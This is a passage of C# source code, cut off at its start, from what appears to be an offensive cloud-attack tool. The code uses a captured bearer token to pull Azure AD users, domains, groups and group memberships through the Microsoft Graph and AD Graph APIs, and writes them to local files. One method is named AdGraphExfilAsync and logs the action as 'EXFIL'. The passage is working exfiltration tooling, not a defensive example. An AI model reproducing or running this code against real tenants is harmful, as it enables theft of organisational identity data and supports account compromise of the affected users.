                             }
                           
                     },
                       maxDegreeOfParallelism: 700);
            }



            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Users.txt"), string.Join('\n', graphUsers.value.Select(x => x.userPrincipalName).ToList()));
            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Users.json"), JsonConvert.SerializeObject(graphUsers, Formatting.Indented));


            var graphDomains = await graphHandler.GetDomainsMsGraph();
            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Domains.json"), JsonConvert.SerializeObject(graphDomains, Formatting.Indented));



            Models.Graph.GroupsResp adGroups = await graphHandler.GetGroupsMsGraph();
            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Groups.json"), JsonConvert.SerializeObject(adGroups, Formatting.Indented));

            var userGroupRelations = new StringBuilder();
            try
            {


                await adGroups?.Value.ParallelForEachAsync(
                async groupObject =>
                {
                    try
                    {

                        var domainGroups = await graphHandler.GetGroupMembersMsGraph(groupObject?.id);

                        foreach (var user in domainGroups?.value)
                        {
                            var userName = (string.IsNullOrEmpty(user.userPrincipalName)) ? user.mail : user.userPrincipalName;

                            if (!string.IsNullOrEmpty(userName))
                                userGroupRelations.AppendLine($"{user.userPrincipalName}:{groupObject.displayName}");
                        }
                    }
                    catch (Exception ex)
                    {


                    }

                },
                maxDegreeOfParallelism: 70);
            }
            catch (Exception ex)
            {


            }

            var filePath = Path.Combine(baseUserOutPath, "MsGraph_Groups.txt");
            File.WriteAllText(filePath, userGroupRelations.ToString());

        }
        private static async Task AdGraphExfilAsync(BearerTokenResp adGraphToken, string baseUserOutPath)
        {

            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating AAD users and groups via MS AD Graph API", "") { }, true);

            var tenantId = Helpers.Generic.GetTenantId(adGraphToken.access_token);

            GraphHandler graphHandler = new GraphHandler(adGraphToken, Helpers.Generic.GetUsername(adGraphToken.access_token));

            var adUsers = await graphHandler.GetUsersAdGraph(tenantId);

            if (adUsers?.value != null)
            {
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Users.txt"), string.Join('\n', adUsers.value?.Select(x => x?.userPrincipalName).ToList()));
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Users.json"), JsonConvert.SerializeObject(adUsers, Formatting.Indented));
            }
            var aadDomains = await graphHandler.GetDomainsAdGraph(tenantId);

            if (aadDomains?.value != null)
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Domains.json"), JsonConvert.SerializeObject(aadDomains, Formatting.Indented));

            var aadGroups = await graphHandler.GetGroupsAdGraph(tenantId);
            if (aadGroups?.value != null)
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Groups.json"), JsonConvert.SerializeObject(aadGroups, Formatting.Indented));


            var userGroupRelations = new StringBuilder();

            if (aadGroups?.value != null)
            {
                await aadGroups?.value?.ParallelForEachAsync(
                    async groupObject =>
                    {
                        var domainGroups = await graphHandler.GetGroupMembersAdGraph(groupObject.objectId, tenantId);

                        foreach (var user in domainGroups.value)
                        {
                            try
                            {
                                var userName = (string.IsNullOrEmpty(user.userPrincipalName)) ? user.mail : user.userPrincipalName;

                                if (!string.IsNullOrEmpty(userName))
                                    userGroupRelations.AppendLine($"{user.userPrincipalName}:{groupObject.onPremisesSamAccountName}");
                            }
                            catch (Exception)
                            {


                            }
                        }

                    },
                    maxDegreeOfParallelism: 70);

                var filePath = Path.Combine(baseUserOutPath, "AdGraph_Groups.txt");
                File.WriteAllText(filePath, userGroupRelations.ToString());
            }
        }

        #endregion

    }

}